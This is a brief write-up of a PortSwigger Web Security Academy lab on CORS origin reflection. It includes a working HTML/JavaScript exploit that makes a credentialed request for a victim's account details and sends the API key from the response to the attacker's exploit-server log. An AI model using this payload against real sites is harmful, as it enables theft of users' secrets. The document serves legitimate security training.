## LAB - 1
**lab link: <https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack>**

 **Topic :-** 

- CORS vulnerability with basic origin reflection.

 **To Solve :-**

- Submit the administrator's API key.

 **Procedure :-**

1. Open site in Burp-suite, login with wiener creds.
2. Open the Get accountDetails request in repeater. Add origin header and random site address, to see if it is CORS vuln. which it is.
3. Then open exploit server and in the body write this code-
```
<html>
	<body>
		<script>
			var xhr = new XMLHttpRequest();
			var url = "https://0a8a00ca04c1a6c4d6bbee5f00ca00c8.web-security-academy.net"
			xhr.onreadystatechange = function () {
				if (xhr.readyState == XMLHttpRequest.DONE){
					fetch("/log?key=" + xhr.responseText)
				}
			}
			xhr.open('GET', url + "/accountDetails", true);
			xhr.withCredentials = true;
			xhr.send(null);
		</script>
	</body>
</html>
```
4. Then store and deliver to the victim. and open access log , where admin api key can be seen , submit it. 